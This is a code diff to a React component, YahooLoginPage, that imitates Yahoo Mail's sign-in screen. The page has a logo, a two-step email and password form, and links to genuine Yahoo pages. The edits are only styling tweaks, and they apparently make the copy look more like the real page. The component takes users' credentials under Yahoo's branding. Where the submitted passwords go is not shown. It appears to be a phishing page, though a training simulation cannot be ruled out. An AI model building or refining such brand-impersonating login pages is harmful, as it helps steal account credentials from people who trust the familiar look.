@@ -14,14 +14,14 @@ const YahooInput = ({ value, onChange, placeholder, type = "text", autoFocus = f
   const hasValue = value.length > 0;
 
   return (
-    <div className="relative">
+    <div className="relative mt-1">
       <label
-        className={`absolute transition-all duration-200 ease-in-out pointer-events-none
-          ${(isFocused || hasValue) ? 'text-xs top-0 text-gray-500' : 'text-base top-1/2 -translate-y-1/2 text-gray-500'}`}
+        className={`absolute transition-all duration-200 ease-in-out pointer-events-none z-0
+          ${(isFocused || hasValue) ? 'text-xs -top-0.5 text-gray-500' : 'text-base top-1/2 -translate-y-1/2 text-gray-500'}`}
       >
         {placeholder}
       </label>
-      {hasValue && type === 'email' && <Mail className="absolute top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />}
+      {hasValue && type === 'email' && <Mail className="absolute top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400 z-10" />}
       <input
         type={type}
         value={value}
@@ -29,7 +29,7 @@ const YahooInput = ({ value, onChange, placeholder, type = "text", autoFocus = f
         onFocus={() => setIsFocused(true)}
         onBlur={() => setIsFocused(false)}
         autoFocus={autoFocus}
-        className={`w-full bg-transparent pt-4 pb-2 border-b transition-colors focus:outline-none ${hasValue && type === 'email' ? 'pl-7' : ''} ${isFocused ? 'border-purple-600' : 'border-gray-300'}`}
+        className={`relative z-0 w-full bg-transparent pt-4 pb-2 border-b transition-colors focus:outline-none ${hasValue && type === 'email' ? 'pl-7' : 'pl-1'} ${isFocused ? 'border-purple-600' : 'border-gray-300'}`}
       />
     </div>
   );
@@ -78,43 +78,43 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
             </p>
           </div>
           <div className="w-full md:w-auto flex-shrink-0">
-            <div className="w-full max-w-[360px] mx-auto p-8 bg-white rounded-2xl" style={{ boxShadow: '0 4px 50px rgba(0,0,0,.1)' }}>
-              <YahooLogo className="h-9 mx-auto mt-2 mb-6" />
+            <div className="w-full max-w-[360px] mx-auto p-7 bg-white rounded-2xl" style={{ boxShadow: '0 4px 60px rgba(0,0,0,.1)' }}>
+              <YahooLogo className="h-9 mx-auto mt-1 mb-5" />
               <h2 className="text-center text-xl font-semibold text-gray-900">
                 {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
               </h2>
               <p className="text-center text-sm text-gray-500 mt-1">using your Yahoo account</p>
-              {showPasswordStep && ( <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div> )}
-              <form onSubmit={handleSubmit} className="mt-6 space-y-4">
+              {showPasswordStep && ( <div className="text-center my-3 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div> )}
+              <form onSubmit={handleSubmit} className="mt-5 space-y-4">
                 {errorMessage && !isLoading && ( <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p> )}
                 {!showPasswordStep ? (
                   <div>
                     <YahooInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" />
-                    <button onClick={handleNext} disabled={!email} className="w-full mt-4 py-3 bg-[#6300be] text-white font-bold rounded-full hover:bg-[#5a00ac] disabled:bg-purple-300 transition-colors">Next</button>
+                    <button onClick={handleNext} disabled={!email} className="w-full mt-4 py-3 bg-[#6300be] text-white font-semibold rounded-full hover:bg-[#5a00ac] disabled:bg-purple-300 transition-colors">Next</button>
                   </div>
                 ) : (
                   <div>
                     <YahooInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
-                    <button type="submit" disabled={isLoading || !password} className="w-full mt-4 py-3 bg-[#6300be] text-white font-bold rounded-full hover:bg-[#5a00ac] disabled:opacity-50 transition-colors">
+                    <button type="submit" disabled={isLoading || !password} className="w-full mt-4 py-3 bg-[#6300be] text-white font-semibold rounded-full hover:bg-[#5a00ac] disabled:opacity-50 transition-colors">
                       {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                     </button>
                   </div>
                 )}
               </form>
-              <div className="text-xs mt-4 flex justify-between items-center">
+              <div className="text-xs mt-3.5 flex justify-between items-center">
                 <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                   <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500" defaultChecked />
                   <span>Stay signed in</span>
                 </label>
-                <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-sm text-[#6300be] hover:underline font-medium">Forgot username?</a>
+                <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-xs text-[#6300be] hover:underline font-medium">Forgot username?</a>
               </div>
-              <div className="mt-6 space-y-4">
-                <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-[#8a2be2] text-[#8a2be2] font-bold rounded-full hover:bg-purple-50 transition-colors">Create an account</a>
-                <div className="relative text-center my-2">
+              <div className="mt-5 space-y-3.5">
+                <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-purple-500 text-purple-600 font-semibold rounded-full hover:bg-purple-50 transition-colors">Create an account</a>
+                <div className="relative text-center my-1">
                   <span className="absolute inset-x-0 top-1/2 h-px bg-gray-200"></span>
                   <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
                 </div>
-                <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-800 font-bold rounded-full hover:bg-gray-50 transition-colors">
+                <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-800 font-semibold rounded-full hover:bg-gray-50 transition-colors">
                   <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" className="w-5 h-5"/>
                   Sign in with Google
                 </a>
